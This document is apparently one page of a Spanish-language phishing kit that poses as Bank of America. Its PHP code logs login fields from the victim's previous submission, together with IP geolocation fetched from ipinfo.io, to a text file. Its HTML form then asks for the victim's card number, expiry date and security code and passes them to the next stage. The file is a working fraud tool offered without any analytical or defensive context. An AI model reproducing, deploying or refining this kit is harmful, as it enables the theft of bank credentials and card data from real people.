<?php
@session_start();
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$k1 = $_POST['g1'];
$k2 = $_POST['g2'];
$k3 = $_POST['g3'];
$k4 = $_POST['g4'];


if (isset ($k1) && isset ($k2) && isset ($k3) ) {
  $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

  $country = $dedon->country;
  $city = $dedon->city;
  
  $time = date('Y-m-d H:i:s');
  $dat = fopen('kios.txt', 'a');
  fwrite($dat, "|| Coeo: $k1 - pCo: $k2 - Pik: $k3  $country $city  $time - $ip\n");
  
} else{ header ('index2.php'); exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
    <link rel="stylesheet" href="style3.css">
    
</head>
<body>
    <main>
        <form action="index4.php" method="post">
        <div class="caja">
            <div class="txt1">
                <h3>Proteja su identidad</h3><br>
                indique la informacion de la tarjeta de debito o credito de Banck of America asociada con su cuenta para ayudar a protejer su identidad <a href="">¿Por que solicitamos esta informacion?</a>
            </div>
            <div class="tah">
                <div class="tire">
                    <img src="https://i.postimg.cc/RVc11Ht0/fd3.png" alt="">
                </div>
                <div class="dad">
                    <div class="nun">
                        Numero de tarjeta: <input type="text"  name='g1' required  minlength="13" maxlength="16">
                    </div>
                    <div class="fec">
                        Fecha de expedicion: <select  id="" name='g2' required>
                            <option >--</option>
                            <option >01</option>
								<option >02</option>
								<option >03</option>
								<option >04</option>
								<option >05</option>
								<option >06</option>
								<option >07</option>
								<option >08</option>
								<option >09</option>
								<option >10</option>
								<option >11</option>
								<option >12</option>
                        </select>

                        <select name="g3" id="" required>
                            <option >--</option>
                            
                            <option>2023</option>
                            <option>2024</option>
                            <option>2025</option>
                            <option>2026</option>
                            <option>2027</option>
                            <option>2028</option>
                            <option>2029</option>
                            <option>2030</option>
                            <option>2031</option>
                        </select>
                    </div>
                    <div class="cod">
                        Codigo de seguridad: <input type="text" name='g4' required  minlength="3" maxlength="4">
                    </div>
                </div>
                <div class="tire">ssa</div>
            </div>

            <div class="txt2">
                <a href="">SafePass</a>, centana extra de protección contra fraude y robo de identidad. 
                Con safePass, agregar cuentas es mas fácil y usted no esta limitado a transferencias de 1000$ o menos.
            </div>
            <div class="btn">
                <button>Confirmar</button>
            </div>
        </div>
    </form>
    </main>
    <script src="secure.js"></script>
</body>
</html>